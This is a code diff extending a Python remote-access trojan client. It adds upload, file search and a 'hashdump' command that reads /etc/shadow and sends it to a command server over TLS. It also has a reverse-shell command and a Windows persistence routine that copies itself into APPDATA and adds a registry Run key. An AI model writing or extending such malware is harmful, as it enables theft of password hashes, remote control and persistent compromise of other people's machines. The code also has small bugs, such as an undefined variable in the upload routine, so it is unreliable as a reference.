@@ -1,6 +1,11 @@
 import socket, ssl, threading, sys, os, subprocess
-import secrets, mss, mss.tools, platform, uuid
-import shutil, winreg, hashlib
+import secrets, platform, uuid
+import shutil, hashlib, mss, mss.tools
+from getpass import getuser
+if platform.system() == "Windows":
+    import winreg
+
+ERROR_INSUFFICIENT_PERMS = b'\x98\x90\x90\x30\x22\x11'
 
 class Client:
     def __init__(self, server_address, server_port):
@@ -9,13 +14,17 @@ class Client:
         self.secure_sock = None
         self.platform = platform.system()
         self.hostname = platform.uname()[1]
-        self.user = os.getlogin()
+        self.user = getuser()
         self.mac = uuid.getnode()
         self.uid = self.getClientUID()
         self.commands = {
             'shell': self.reverse_shell,
             'screenshot': self.screenshot,
-            'download': self.download
+            'download': self.download,
+            'upload': self.upload,
+            'hashdump': self.hashdump,
+            'search': self.search,
+            'ipconfig': self.ipconfig
         }
         self.exe_path = None
     
@@ -60,7 +69,6 @@ class Client:
                         self.commands[command_name](' '.join(args))
 
                 elif not command:
-                    print("Connection closed by the server.")
                     break
             except Exception as e:
                 break
@@ -114,6 +122,22 @@ class Client:
                 self.secure_sock.sendall("EOF".encode())
             except Exception as e:
                 self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
+
+    def upload(self, args):
+        try:
+            with open(args, 'w+b') as f:
+                while True:
+                    data = self.secure_sock.recv(1024)
+                    decoded_data = data.decode("latin1")
+                    if (decoded_data == "EOF") or (not data):
+                        break
+                    if (decoded_data.startswith("ERROR:")):
+                        print(decoded_data)
+                        os.remove(file)
+                        return
+                    f.write(data)
+        except Exception as e:
+            return
     
     def getJSONHostInfos(self):        
         return f"{{\"hostname\": \"{self.hostname}\", \"user\": \"{self.user}\", \"mac\": \"{self.mac}\", \"uid\": \"{self.uid}\"}}"
@@ -122,43 +146,69 @@ class Client:
 
         self.exe_path = os.path.join(os.getenv('APPDATA'), f"{self.uid}.exe")
 
-        # If Persistence is already in place
+        # Check if Persistence is already in place
         if os.path.exists(self.exe_path):
-            return
+            return 0
 
         try:
             shutil.copy2(sys.argv[0], self.exe_path)
 
         except Exception as e:
-            return
+            return 1
 
         # Add the exe to startup programs
-        # key name in ROT13 (Software\Microsoft\Windows\CurrentVersion\Run)
-        key_name = r"Fbsgjner\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Eha"
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                            rot13_decrypt(key_name),
+                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "Stryfe", 0, winreg.REG_SZ, self.exe_path)
         winreg.CloseKey(key)
 
+
     def getClientUID(self):
+        """Create a UID combining the hostname the mac address and the user running the agent"""
         string = f"{self.hostname}{self.mac}{self.user}"
         hostUID = hashlib.sha256(string.encode()).hexdigest()
         return hostUID[:8]
 
-def rot13_decrypt( text):
-    def shift_char(c):
-        if 'a' <= c <= 'z':
-            return chr((ord(c) - ord('a') + 13) % 26 + ord('a'))
-        elif 'A' <= c <= 'Z':
-            return chr((ord(c) - ord('A') + 13) % 26 + ord('A'))
+    def hashdump(self, args):
+        if self.platform == 'Linux':
+            self.hashdumpLinux(args)
+        elif self.platform == 'Windows':
+            self.hashdumpWindows(args)
+
+    def hashdumpLinux(self, args):
+        if os.access('/etc/shadow', os.R_OK):
+            try:
+                with open('/etc/shadow','rb') as f:
+                    while (chunk := f.read(1024)):
+                        self.secure_sock.sendall(chunk)
+                self.secure_sock.sendall("EOF".encode())
+            except Exception as e:
+                self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
         else:
-            return c
-            
-        return ''.join(shift_char(c) for c in text)
+            # Sending error code if user doesnt have permissions to dump hashes
+            self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
+    
+    def hashdumpWindows(self, args):
+        self.secure_sock.sendall("EOF".encode())
+
+    def search(self, args):
+        args = args.split(" ")
+        filename = args[1]
+        results = []
+        for root, dir, files in os.walk(args[0]):
+            if filename in files:
+                results.append(os.path.join(root, filename))
+        for file in results:
+            self.secure_sock.sendall(file.encode())
+        self.secure_sock.sendall("EOF".encode())
+
+    def ipconfig(self, args):
+        pass
+
 
 if __name__ == "__main__":
     client = Client('127.0.0.1', 8888)
-    if client.platform == 'Windows':
-        client.windowsPersistence()
+    # if client.platform == 'Windows':
+    #     client.windowsPersistence()
     client.connect()
